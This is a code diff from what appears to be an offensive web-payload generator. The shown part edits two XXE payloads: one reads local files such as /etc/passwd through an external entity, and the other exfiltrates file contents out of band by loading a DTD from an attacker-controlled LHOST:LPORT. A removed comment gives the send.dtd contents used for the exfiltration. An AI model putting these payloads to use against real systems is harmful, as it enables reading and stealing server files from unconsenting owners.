@@ -9,7 +9,7 @@ var red = log.red
 var M = require('mstring')
 var question = require('../modules/questionUser');
 
-var web = require("../modules/webserver.js")
+var web = require("../modules/webserver/webserver.js")
 
 // Payload Array
 arrayWeb = []
@@ -56,19 +56,21 @@ Load({
 
 Load({
 	title: "XXE (Local File Read)",
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://$$PROMPT$$\"> ]]>&bar;",
-	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<remote file path>\"> ]]&bar;>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]]>&bar;",
 	category: "XML",
 	callback: function(returnToPrepare){
-		question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")
+		
+	  question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare)			
+		
 	}
 })
 
+
+		//
+
 Load({
 	title: "XXE (Local File Exfiltration using parameter entities)",
-	// description: "-"+options(" LHOST=<lhost>, LPORT=<lport>, PROMPT=<remote file path>")+log.blackBright("\nLocally hosted send.dtd should contain the following: <!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://<lhost>:<lport>/?%file;'>\"> %all;"),
-	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://$$PROMPT$$\"><!ENTITY % dtd SYSTEM \"http://$$LHOST$$:$$LPORT$$/send.dtd\">%dtd;%send; ]]>",
-	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<remote file path>\"><!ENTITY % dtd SYSTEM \"http://<lhost>:<lport>/send.dtd\">%dtd;%send; ]]>",
+	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM \"file://<PROMPT>\"><!ENTITY % dtd SYSTEM \"http://<LHOST>:<LPORT>/send.dtd\">%dtd;%send; ]]>",
 	category: "XML",
 	callback: function(returnToPrepare){
 		question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")
